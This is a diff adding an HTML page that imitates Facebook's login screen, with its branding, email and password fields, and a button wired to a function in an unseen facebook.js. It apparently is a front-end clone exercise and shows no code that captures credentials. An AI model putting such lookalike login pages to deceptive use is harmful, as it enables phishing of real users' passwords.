@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="facebook.js"></script> <!-- Include external JavaScript file -->
+</head>
+<body>
+
+    <!-- Main container for login content -->
+    <div id="login-container">
+        <h1>Facebook</h1>
+        <h4>Facebook helps you connect and <br>share with the people in your life.</h4>
+
+        <!-- Login box with email/phone and password inputs -->
+        <div id="box">
+            <input type="text" placeholder="Email or Phone Number" id="Email">
+            <input type="password" placeholder="Password" id="pass">
+            
+            <!-- Log in button with a link to a Facebook page -->
+            <button id="log_in" onclick="myfun_1()">
+                <a href="https://www.facebook.com/Meta" id="log-in">Log in</a>
+            </button>
+            
+            <!-- Forgotten password link -->
+            <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" id="forgt_pass">Forgotten password?</a>
+            <hr>
+            
+            <!-- Create a new account link -->
+            <a href="https://www.facebook.com" id="new_accont">Create New Account</a>
+        </div>
+
+        <!-- Additional information and link to create a page -->
+        <p id="last_line">
+            <a href="https://www.facebook.com/pages/create/?ref_type=registration_form" id="crt_pg">Create a Page</a> for a celebrity, brand or business.
+        </p>
+    </div>
+
+</body>
+</html>
